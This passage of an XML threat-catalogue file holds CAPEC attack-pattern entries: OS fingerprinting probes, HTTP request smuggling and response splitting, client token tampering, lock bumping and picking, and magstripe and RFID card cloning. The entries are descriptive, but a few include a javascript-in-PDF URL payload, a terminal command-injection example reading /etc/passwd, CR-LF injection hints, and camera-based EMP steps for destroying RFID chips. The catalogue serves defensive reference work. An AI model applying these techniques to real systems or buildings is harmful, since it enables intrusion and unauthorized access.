  <description>This OS fingerprinting probe checks the initial TCP Window size. TCP stacks limit the range of sequence numbers allowable within a session to maintain the &quot;connected&quot; state within TCP protocol logic. The initial window size specifies a range of acceptable sequence numbers that will qualify as a response to an ACK packet within a session. Various operating systems use different Initial window sizes. The initial window size can be sampled by establishing an ordinary TCP connection.</description>
</threat>
<threat label="CAPEC-327" name="TCP Options Probe" type="Detailed" reference="CAPEC">
  <description>This OS fingerprinting probe analyzes the type and order of any TCP header options present within a response segment. Most operating systems use unique ordering and different option sets when options are present. RFC 793 does not specify a required order when options are present, so different implementations use unique ways of ordering or structuring TCP options. TCP options can be generated by ordinary TCP traffic.</description>
</threat>
<threat label="CAPEC-328" name="TCP 'RST' Flag Checksum Probe" type="Detailed" reference="CAPEC">
  <description>This OS fingerprinting probe performs a checksum on any ASCII data contained within the data portion or a RST packet. Some operating systems will report a human-readable text message in the payload of a 'RST' (reset) packet when specific types of connection errors occur. RFC 1122 allows text payloads within reset packets but not all operating systems or routers implement this functionality.</description>
</threat>
<threat label="CAPEC-329" name="ICMP Error Message Quoting Probe" type="Detailed" reference="CAPEC">
  <description>An attacker uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the amount of data returned or &quot;Quoted&quot; from the originating request that generated the ICMP error message. For this purpose &quot;Port Unreachable&quot; error messages are often used, as generating them requires the attacker to send a UDP datagram to a closed port on the target. The goal of this analysis to make inferences about the type of operating system or firmware that sent the error message in reply. This is useful for identifying unique characteristics of operating systems because the RFC-1122 expected behavior reads: &quot;Every ICMP error message includes the Internet header and at least the first 8 data octets of the datagram that triggered the error; more than 8 octets MAY be sent [...].&quot; This contrasts with RFC-792 expected behavior, which limited the quoted text to 64 bits (8 octets). Given the latitude in the specification the resulting RFC-1122 stack implementations often respond with a high degree of variability in the amount of data quoted in the error message because &quot;older&quot; or &quot;legacy&quot; stacks may comply with the RFC-792 specification, while other stacks may choose a longer format in accordance with RFC-1122. As a general rule most operating systems or firmware will quote the first 8 bytes of the datagram triggering the error, but some IP stacks will quote more than the first 8 bytes of data.</description>
</threat>
<threat label="CAPEC-33" name="HTTP Request Smuggling" type="Detailed" reference="CAPEC">
  <description>HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it.Determine the technologies used in the target environment such as types of web servers, application firewalls, proxies, etc.Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand the parsing chain traversed by the incoming HTTP request.Attacker sends malformed HTTP Requests to the application looking for differences in the ways that individual layers in the parsing chain parse requests. When differences are identified, the attacker crafts specially malformed HTTP requests to determine if the identified parsing differences will allow extra requests to be smuggled through parsing layers.Create many consecutive requests to the server. Some of which must be malformed.Use a proxy tool to record the HTTP responses headers.At some point, the server is waiting for more request information to send the last response.No response is being received.Malformed HTTP requests are being totally ignored.Responses are being sent even if the HTTP header is incomplete.The attacker decides to target the cache server. The server will then cache the request and serve a wrong page to a legitimate user's request. The malicious request will most likely exploit a Cross-Site Scripting or another injection typed vulnerability.Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will be processed and acted on by the outer parsing layer of the cache server but not by the inner application layer. In this way it will be cached by the server without obvious sign from the application and the corrupt data will be served to future requesters.The attacker decides to target the web server by crafting a malicious HTTP Request containing a second HTTP Request using syntax that will not be processed and acted on by an outer &quot;filter&quot; parsing layer but will be acted on by the inner web server/application processing layers. The application/web server will then act on the malicious HTTP Request as if it is a valid request from the client potentially subverting session management.Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will not be processed and acted on by the outer parsing layer of the malicious content filters but will be by the inner application/web server layer. In this way it will be acted on by the application/web server as if it is a valid request from the client.If system documentation is available, the attacker can look up the exact versions of the two targeted entities, since different versions of the same system often behave differently. The attacker can also use product-specific documentation to figure out differences in parsing HTTP requests between the two entities.In case where no documentation is available, the attacker needs to reliably fingerprint the targeted entities to discover the nature and version of the entities. Having done this, the attacker then needs to experimentally determine how the two entities differ in parsing requests.Differences in requests processed by the two entities. This requires careful monitoring or a capable log analysis tool.The impact of activation is that a particular request that was not supposed to pass through the first entity is received by the second entity who responds to it. This can defeat protection against malware or lead to Cross-Site Scripting</description>
</threat>
<threat label="CAPEC-330" name="ICMP Error Message Echoing Integrity Probe" type="Detailed" reference="CAPEC">
  <description>An attacker uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the integrity of data returned or &quot;Quoted&quot; from the originating request that generated the error message. For this purpose &quot;Port Unreachable&quot; error messages are often used, as generating them requires the attacker to send a UDP datagram to a closed port on the target. When replying with an ICMP error message some IP/ICMP stack implementations change aspects of the IP header, change or reverse certain byte orders, reset certain field values to default values which differ between operating system and firmware implementations, and make other changes. Some IP/ICMP stacks are decidedly broken, indicating a idiosyncratic behavior that differs from the RFC specifications, such as the case when miscalculations affect a field value. A tremendous amount of information about the host operating system can be deduced from its 'echoing' characteristics. Notably, inspection of key protocol header fields, including the echoed header fields of the encapsulating protocol can yield a wealth of data about the host operating system or firmware version.</description>
</threat>
<threat label="CAPEC-331" name="ICMP IP Total Length Field Probe" type="Detailed" reference="CAPEC">
  <description>An attacker sends a UDP packet to a closed port on the target machine to solicit an IP Header's total length field value within the echoed 'Port Unreachable&quot; error message. RFC1122 specifies that the Header of the request must be echoed back when an error is sent in response, but some operating systems and firmware alter the integrity of the original header. Non-standard ICMP/IP implementations result in response that are useful for individuating remote operating system or router firmware versions. There are four general response types that can be used to distinguish operating systems apart.1. The IP total length field may be calculated correctly.2. An operating system may add 20 or more additional bytes to the length calculation.3. The operating system may subtract 20 or more bytes from the correct length of the field4. The IP total length field is calculated with any other incorrect value.This type of behavior is useful for building a signature-base of operating system responses, particularly when error messages contain other types of information that is useful identifying specific operating system responses.</description>
</threat>
<threat label="CAPEC-332" name="ICMP IP 'ID' Field Error Message Probe" type="Detailed" reference="CAPEC">
  <description>An attacker sends a UDP datagram having an assigned value to its internet identification field (ID) to a closed port on a target to observe the manner in which this bit is echoed back in the ICMP error message. The internet identification field (ID) is typically utilized for reassembling a fragmented packet. RFC791 and RFC815 discusses about IP datagrams, fragmentation and reassembly. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within the ICMP error message. There are 3 behaviors that can be used to distinguish remote operating systems or firmware.1.The IP ID field is echoed back identically to the bit order of the ID field in the original IP header.2.The IP ID field is echoed back, but the byte order has been reversed.2.The IP ID field contains an incorrect or unexpected value. Different operating systems will respond by setting the IP ID field differently within error messaging. This allows the attacker to construct a fingerprint of specific OS behaviors.</description>
</threat>
<threat label="CAPEC-34" name="HTTP Response Splitting" type="Detailed" reference="CAPEC">
  <description>This attack uses a maliciously-crafted HTTP request in order to cause a vulnerable web server to respond with an HTTP response stream that will be interpreted by the client as two separate responses instead of one. This is possible when user-controlled input is used unvalidated as part of the response headers. The target software, the client, will interpret the injected header as being a response to a second request, thereby causing the maliciously-crafted contents be displayed and possibly cached.To achieve HTTP Response Splitting on a vulnerable web server, the attacker:Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links, the forms and all potential user-controllable input points for the web application.Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL, forms found in the pages (like file upload, etc.).Use a proxy tool to record all links visited during a manual traversal of the web application.Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.Inputs are transported through HTTPThe application uses redirection techniques (HTTP Location, etc.)Using URL rewriting, parameters may be part of the URL path.No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attacker injects the entry points identified in the Explore Phase with response splitting syntax and variations of payloads to be acted on in the additional response. He records all the responses from the server that include unmodified versions of his payload.Use CR\LF characters (encoded or not) in the payloads in order to see if the HTTP header can be split.Use a proxy tool to record the HTTP responses headers.The web server uses unvalidated user-controlled input as part of the response headersAs the attacker succeeds in exploiting the vulnerability, he can choose to attack the user with Cross-Site Scripting. The possible outcomes of such an attack are described in the Cross-Site Scripting related attack patterns.Inject cross-site scripting payload preceded by response splitting syntax (CR/LF) into user-controllable input identified as vulnerable in the Experiment Phase.The attacker decides to target the cache server by forging new responses. The server will then cache the second request and response. The cached response has most likely an attack vector like Cross-Site Scripting; this attack will then be serve to many clients due to the caching system.System performs caching of HTTP responsesWith available source code, the attacker can see whether user input is validated or not before being used as part of output. This can also be achieved with static code analysis toolsIf source code is not available, the attacker can try injecting a CR-LF sequence (usually encoded as %0d%0a in the input) and use a proxy such as Paros to observe the response. If the resulting injection causes an invalid request, the web server may also indicate the protocol error.The only indicators are multiple responses to a single request in the web logs. However, this is difficult to notice in the absence of an application filter proxy or a log analyzer. There are no indicators for the clientThe impact of payload activation is that two distinct HTTP responses are issued to the target, which interprets the first as response to a supposedly valid request and the second, which causes the actual attack, to be a response to a second dummy request issued by the attacker.</description>
</threat>
<threat label="CAPEC-35" name="Leverage Executable Code in Nonexecutable Files" type="Standard" reference="CAPEC">
  <description>An attack of this type exploits a system's trust in configuration and resource files, when the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser. Another example targets clients reading pdf files. In this case the attacker simply appends javascript to the end of a legitimate url for a pdf (http://www.gnucitizen.org/blog/danger-danger-danger/)http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_hereThe client assumes that they are reading a pdf, but the attacker has modified the resource and loaded executable javascript into the client's browser process.The attack can also target server processes. The attacker edits the resource or configuration file, for example a web.xml file used to configure security permissions for a J2EE app server, adding role name &quot;public&quot; grants all users with the public role the ability to use the administration functionality.The server trusts its configuration file to be correct, but when they are manipulated, the attacker gains full control.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-36" name="Using Unpublished Web Service APIs" type="Detailed" reference="CAPEC">
  <description>An attacker searches for and invokes Web Services APIs that the target system designers did not intend to be publicly available. If these APIs fail to authenticate requests the attacker may be able to invoke services and/or gain privileges they are not authorized for.Discover a web service of interest, by exploring web service registry listings or by connecting on known port or some similar meansAuthenticate to the web service, if required, in order to explore it.Determine the exposed interfaces by querying the registry as well as probably sniffing to expose interfaces that are not explicitly listed.Probing techniques should often follow normal means of identifying services. Attackers will simply have to execute code that sends the appropriate interrogating SOAP messages to suspected UDDI services (in web-services scenarios). Attackers will likely want to detect and query the organization's SOA Registry.Probing techniques become more difficult when the service isn't advertised, or doesn't leverage discovery frameworks such as UDDI or the WS-I standard. In these cases, sniffing network traffic may suffice, depending on whether or not discovery occurs over a protected channel.</description>
</threat>
<threat label="CAPEC-37" name="Lifting Data Embedded in Client Distributions" type="Standard" reference="CAPEC">
  <description>An attacker can resort to stealing data embedded in client distributions or client code in order to gain certain information. This information can reveal confidential contents, such as account numbers, or can be used as an intermediate step in a larger attack (such as by stealing keys/credentials).Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), or other machine code.Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack.Proprietary or sensitive data is stored in a location ultimately distributed to end users.Access to binary code is not realistic. For example, in a client-server environment, binary code on the server is presumed to be inscrutable to an attacker unless another vulnerability exposes it.The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to extract the information of interest.API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.Cryptanalysis. The attacker performs cryptanalysis to identify data in the client component which may be cryptographically significant. (Key material frequently stands out as very high entropy data when compared to other mundane data). Given cryptographically significant data, other analyses are performed (e.g., length, internal structure, etc.) to determine potential algorithms (RSA, ECC, AES, etc.). This process proceeds until the attacker reaches a conclusion about the significance and use of the data.Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.Common data typing. The attacker looks for common file signatures for well known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, he attempts decoding in that format.Well known data types are used and embedded inside the client-accessible code.Proprietary data encodings are used. Although this incrementally increases the difficulty for an attacker to decode the data, it provides no better protection than well-known data types. Since few software developers are trained in obfuscation and cryptography, most proprietary encodings add little security value.Attackers may confine (and succeeed with) probing as simple as deleting a cache or data file, or less drastically twiddling its bits and then testing the mutation's effect on an executing client.At the other extreme, attackers capable of reverse engineering client code will have the ability to remove functionality or identify the whereabouts of sensitive data through whitebox analysis, such as review of reverse-engineered code.</description>
</threat>
<threat label="CAPEC-38" name="Leveraging/Manipulating Configuration File Search Paths" type="Standard" reference="CAPEC">
  <description>This attack loads a malicious resource into a program's standard path used to bootstrap and/or provide contextual information for a program like a path variable or classpath. J2EE applications and other component based applications that are built from mutliple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker.A standard UNIX path looks similar to thisIf the attacker modifies the path variable to point to a locale that includes malicious resources then the user unwittingly can execute commands on the attacker's behalf:This is a form of usurping control of the program and the attack can be done on the classpath, database resources, or any other resources built from compound parts. At runtime detection and blocking of this attack is nearly impossible, because the configuration allows execution.</description>
</threat>
<threat label="CAPEC-383" name="Harvesting Usernames or UserIDs via Application API Event Monitoring" type="Detailed" reference="CAPEC">
  <description>An attacker hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the attacker creating an event within the sub-application. Assume the attacker hosts a &quot;virtual sale&quot; of rare items. As other users enter the event, the attacker records via MITM proxy the user_ids and usernames of everyone who attends. The attacker would then be able to spam those users within the application using an automated script.</description>
</threat>
<threat label="CAPEC-384" name="Application API Message Manipulation via Man-in-the-Middle" type="Meta" reference="CAPEC">
  <description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system. Despite the use of MITM software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true &quot;Man-in-the-Middle&quot; attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client.</description>
</threat>
<threat label="CAPEC-385" name="Transaction or Event Tampering via Application API Manipulation" type="Standard" reference="CAPEC">
  <description>An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process.</description>
</threat>
<threat label="CAPEC-386" name="Application API Navigation Remapping" type="Standard" reference="CAPEC">
  <description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photogallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud.</description>
</threat>
<threat label="CAPEC-387" name="Navigation Remapping To Propagate Malicoius Content" type="Standard" reference="CAPEC">
  <description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attacker's intent. When the goal is to spread malware, deceptive content is created such as modified links, buttons, or images, that entice users to click on those items, all of which point to a malicious URI. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the destination of various application interface elements.</description>
</threat>
<threat label="CAPEC-388" name="Application API Button Hijacking" type="Standard" reference="CAPEC">
  <description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination. For example, an in-game event occurs and the attacker traps the result, which turns out to be a form that will be populated to their primary profile. The attacker, using a MITM proxy, observes the following data:[Button][Claim_Item]Sourdough_Cookie[URL_IMG]foo[/URL_IMG][Claim_Link]bar[/Claim_Link]By altering the destination of &quot;Claim_Link&quot; to point to the attackers server an unwitting victim can be enticed to click the link. Another example would be for the attacker to rewrite the button destinations for an event so that clicking &quot;Yes&quot; or &quot;No&quot; causes the user to load the attackers code.</description>
</threat>
<threat label="CAPEC-389" name="Content Spoofing Via Application API Manipulation" type="Standard" reference="CAPEC">
  <description>An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attacker's intent. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system.</description>
</threat>
<threat label="CAPEC-39" name="Manipulating Opaque Client-based Data Tokens" type="Standard" reference="CAPEC">
  <description>In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.The attacker identifies the parameters used as part of tokens to take business or security decisionsUse WebScarab to reveal hidden fields while browsing.Use a sniffer to capture packetsView source of web page to find hidden fieldsExamine URL to see if any opaque tokens are in itDisassemble or decompile client-side applicationUse debugging tools such as File Monitor, Registry Monitor, Debuggers, etc.Opaque hidden form fields in a web pageOpaque session tokens/ticketsOpaque protocol fieldsOpaque Resource LocatorThe attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may may be obfuscated or a full blown encryption may be used.Look for signs of well-known character encodingsLook for cryptographic signaturesLook for delimiters or other indicators of structureStandard signatures of well-known encodings detectedToken or structural block's length being multiple of well-known block size of a cryptographic algorithmClear structural boundaries or delimitersFailure outcome in previous stepTrying each parameter in turn, the attacker modifies the valuesModify tokens logicallyModify tokens arithmeticallyModify tokens bitwiseModify structural components of tokensModify order of parameters/tokensSuccess outcome in first step.Failure outcome in first stepDepending on the nature of the application, the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the serverUse network-level packet injection tools such as netcatUse application-level data modification tools such as Tamper Data, WebScarab, TamperIE, etc.Use modified client (modified by reverse engineering)Use debugging tools to modify data in clientSuccess outcome in first stepFailure outcome in first stepTamper with the client side data token and observe the effects it has on interaction with the system.This attack is in and of itself a trial-and-error-based probing technique.</description>
</threat>
<threat label="CAPEC-390" name="Bypassing Physical Security of Systems or Facilities" type="Meta" reference="CAPEC">
  <description>Facilities often used layered models for physical security such as traditional locks, Electronic-based card entry systems, coupled with physical alarms. Hardware security mechanisms range from the use of computer case and cable locks as well as RFID tags for tracking computer assets. This layered approach makes it difficult for random physical security breaches to go unnoticed, but is less effective at stopping deliberate and carefully planned break-ins. Avoiding detection begins with evading building security and surveillance and methods for bypassing the electronic or physical locks which secure entry points.</description>
</threat>
<threat label="CAPEC-391" name="Bypassing Physical Locks" type="Meta" reference="CAPEC">
  <description>An attacker uses techniques and methods to bypass physical security mesures of a building or facility. Physical locks may range from traditional lock and key mechanisms, cable locks used to secure laptops or servers, locks on server cases, or other such devices. Techniques such as lock bumping, lock forcing via snap guns, or lock picking can be employed to bypass those locks and gain access to the facilities or devices they protect, although stealth, evidence of tampering, and the integrity of the lock following an attack, are considerations that may determine the method employed. Physical locks are limited by the complexity of the locking mechanism. While some locks may offer protections such as shock resistant foam to prevent bumping or lock forcing methods, many commonly employed locks offer no such countermeasures.</description>
</threat>
<threat label="CAPEC-392" name="Lock Bumping" type="Meta" reference="CAPEC">
  <description>An attacker uses a bump key to force a lock on a building or facility and gain entry. Lock Bumping is the use of a special type of key that can be tapped or bumped to cause the pins within the lock to fall into temporary alignment, allowing the lock to be opened. Lock bumping allows an attacker to open a lock without having the correct key. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A bump key is a specially constructed key that exploits this design. When the bump key is struck or firmly tapped, its teeth transfer the force of the tap into the key pins, causing the lock to momentarily shift into proper alignment for the mechanism to be opened.</description>
</threat>
<threat label="CAPEC-393" name="Lock Picking" type="Standard" reference="CAPEC">
  <description>An attacker uses lock picking tools and techniques to bypass the locks on a building or facility. Lock picking is the use of a special set of tools to manipulate the pins within a lock. Different sets of tools are required for each type of lock. Lock picking attacks have the advantage of being non-invasive in that if performed correctly the lock will not be damaged. A standard lock pin-and-tumbler lock is secured by a set of internal pins that prevent the tumbler device from turning. Spring loaded driver pins push down on the key pins preventing rotation so that the bolt remains in a locked position.. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. Most common locks, such as domestic locks in the US, can be picked using a standard 2 tools (i.e. a torsion wrench and a hook pick).</description>
</threat>
<threat label="CAPEC-394" name="Using a Snap Gun Lock to Force a Lock" type="Standard" reference="CAPEC">
  <description>An attacker uses a Snap Gun, also known as a Pick Gun, to force the lock on a building or facility. A Pick Gun is a special type of lock picking instrument that works on similar principles as lock bumping. A snap gun is a hand-held device with an attached metal pick. The metal pick strikes the pins within the lock, transferring motion from the key pins to the driver pins and forcing the lock into momentary alignment. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A Snap Gun exploits this design by using a metal pin to strike all of the key pins at once, forcing the driver pins to shift into an unlocked position. Unlike bump keys or lock picks, a Snap Gun may damage the lock more easily, leaving evidence that the lock has been tampered with.</description>
</threat>
<threat label="CAPEC-395" name="Bypassing Electronic Locks and Access Controls" type="Standard" reference="CAPEC">
  <description>An attacker exploits security assumptions to bypass electronic locks or other forms of access controls. Most attacks against electronic access controls follow similar methods but utilize different tools. Some electronic locks utilize magnetic strip cards, others employ RFID tags embedded within a card or badge, or may involve more sophisticated protections such as voice-print, thumb-print, or retinal biometrics. Magnetic Strip and RFID technologies are the most widespread because they are cost effective to deploy and more easily integrated with other electronic security measures. These technologies share common weaknesses that an attacker can exploit to gain access to a facility protected by the mechanisms via copying legitimate cards or badges, or generating new cards using reverse-engineered algorithms.</description>
</threat>
<threat label="CAPEC-396" name="Bypassing Card or Badge-Based Systems" type="Standard" reference="CAPEC">
  <description>An attacker bypasses the security of a card-based system by using techniques such as cloning access cards or using brute-force techniques. Card-based systems are widespread throughout business, government, and supply-chain management. Attacks against card-based systems vary widely based on the attackers goals, but commonly include unauthorized reproduction of cards, brute-force creation of valid card-values, and attacks against systems which read or process card data. Due to the inherent weaknesses of card and badge security, high security environments will rarely rely upon the card or badge alone as a security mechanism. Common card based systems are used for financial transactions, user identification, and access control. Cloning attacks involve making an unauthorized copy of a user's card while brute-force attacks involve creating new cards with valid values. Denial of service attacks against card-based systems involve rendering the reader, or the card itself, to become disabled. Such attacks may be useful in a fail-closed system for keeping authorized users out of a location while a crime is in progress, whereas fail-open systems may grant access, or an alarm my fail to trigger, if an attacker disables or damages the card authentication device.</description>
</threat>
<threat label="CAPEC-397" name="Cloning Magnetic Strip Cards" type="Standard" reference="CAPEC">
  <description>An attacker duplicates the data on a Magnetic strip card (i.e. 'swipe card' or ‘magstripe’) to gain unauthorized access to a physical location or a person's private information. Magstripe cards encode data on a band of iron-based magnetic particles arrayed in a stripe along a rectangular card. Most magstripe card data formats conform to ISO standards 7810, 7811, 7813, 8583, and 4909. The primary advantage of magstripe technology is ease of enconding and portability, but this also renders magnetic strip cards susceptible to unauthorized duplication. If magstripe cards are used for access control, all an attacker need do is obtain a valid card long enough to make a copy of the card and then return the card to its location (i.e. a co-worker’s desk). Magstripe reader/writers are widely available as well as software for analyzing data encoded on the cards. By swiping a valid card, it becomes trivial to make any number of duplicates that function as the original.</description>
</threat>
<threat label="CAPEC-398" name="Magnetic Strip Card Brute Force Attacks" type="Standard" reference="CAPEC">
  <description>An attacker analyzes the data on two or more magnetic strip cards and is able to generate new cards containing valid sequences that allow unauthorized access and/or impersonation of individuals. Often, magnetic strip encoding methods follow a common format for a given system laid out in up to three tracks. A single card may allow access to a corporate office complex shared by multiple companies. By analyzing how the data is stored on a card, it is also possible to create valid cards via brute-force attacks. For example, a single card can grant access to a building, a floor, and a suite number. Reading and analyzing data on multiple cards, then performing a difference analysis between data encoded on three different cards, can reveal clues as to how to generate valid cards that grant access to restricted areas of a building or suites/rooms within that building. Data stored on magstripe cards is often unencrypted, therefore comparing which data changes when two or more cards are analyzed can yield results that aid in determining the structure of the card data. A trivial example would be a common system data format on a data track which binary encodes the suite number of a building that a card will open. By creating multiple cards with differing binary encoded segments it becomes possible to enter unauthorized areas or pass through checkpoints giving the electronic ID of other persons.</description>
</threat>
<threat label="CAPEC-399" name="Cloning RFID Cards or Chips" type="Standard" reference="CAPEC">
  <description>An attacker analyzes data returned by an RFID chip and uses this information to duplicate a RFID signal that responds identically to the target chip. In some cases RFID chips are used for building access control, employee identification, or as markers on products being delivered along a supply chain. Some organizations also embed RFID tags inside computer assets to trigger alarms if they are removed from particular rooms, zones, or buildings. Similar to Magnetic strip cards, RFID cards are susceptible to duplication (cloning) and reuse. RFID (Radio Frequency Identification) are passive devices which consist of an integrated circuit for processing RF signals and an antenna. RFID devices are passive in that they lack an on on-board power source. The majority of RFID chips operate on either the 13.56 MHz or 135 KHz frequency. The chip is powered when a signal is received by the antenna on the chip, powering the chip long enough to send a reply messge. An attacker is able to capture and analyze RFID data by either stimulating the chip to respond or being proximate to the chip when it sends a response to a remote transmitter. This allows the attacker to duplicate the signal and conduct attacks such as gaining unauthorized access to a building or impersonating a user’s identification.</description>
</threat>
<threat label="CAPEC-4" name="Using Alternative IP Address Encodings" type="Detailed" reference="CAPEC">
  <description>This attack relies on the attacker using unexpected formats for representing IP addresses. Networked applications may expect network location information in a specific format, such as fully qualified domains names, URL, IP address, or IP Address ranges. The issue that the attacker can exploit is that these design assumptions may not be validated against a variety of different possible encodings and network address location formats. Applications that use naming for creating policy namespaces for managing access control may be susceptible to queryin directly by IP addresses, which is ultimately a more generally authoritative way of communicating on a network.Alternative IP addresses can be used by the attacker to bypass application access control in order to gain access to data that is only protected by obscuring its location.In addition this type of attack can be used as a reconnaissance mechansim to provide entry point information that the attacker gathers to penetrate deeper into the system.Enables attacker to view and access unexpected network services.</description>
</threat>
<threat label="CAPEC-40" name="Manipulating Writeable Terminal Devices" type="Detailed" reference="CAPEC">
  <description>This attack exploits terminal devices that allow themselves to be written to by other users. The attacker sends command strings to the target terminal device hoping that the target user will hit enter and thereby execute the malicious command with their privileges. The attacker can send the results (such as copying /etc/passwd) to a known directory and collect once the attack has succeeded.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-400" name="RFID Chip Deactivation or Destruction" type="Standard" reference="CAPEC">
  <description>An attacker uses methods to deactivate a passive RFID tag for the purpose of rendering the tag, badge, card, or object containing the tag unresponsive. RFID tags are used primarily for access control, inventory, or anti-theft devices. The purpose of attacking the RFID chip is to disable or damage the chip without causing damage to the object housing it. When correctly performed the RFID chip can be disabled or destroyed without visible damage or marking to whatever item or device containing the chip. Attacking the chip directly allows for the security device or method to be bypassed without directly damaging the device itself, such as an alarm system or computer system Various methods exist for damaging or deactivating RFID tags. For example, most common RFID chips can be permanently destroyed by creating a small electromagnetic pulse near the chip itself. One method employed requires the modifying a disposable camera by disconnecting the flash bulb and soldering a copper coil to the capacitor. Firing the camera in this configuration near any RFID chip-based device creates an EMP pulse sufficient to destroy the chip without leaving evidence of tampering. So far this attack has been demonstrated to work against RFID chips in the 13.56 MHz range.</description>
</threat>
<threat label="CAPEC-401" name="Hacking Hardware Devices or Components" type="Detailed" reference="CAPEC">
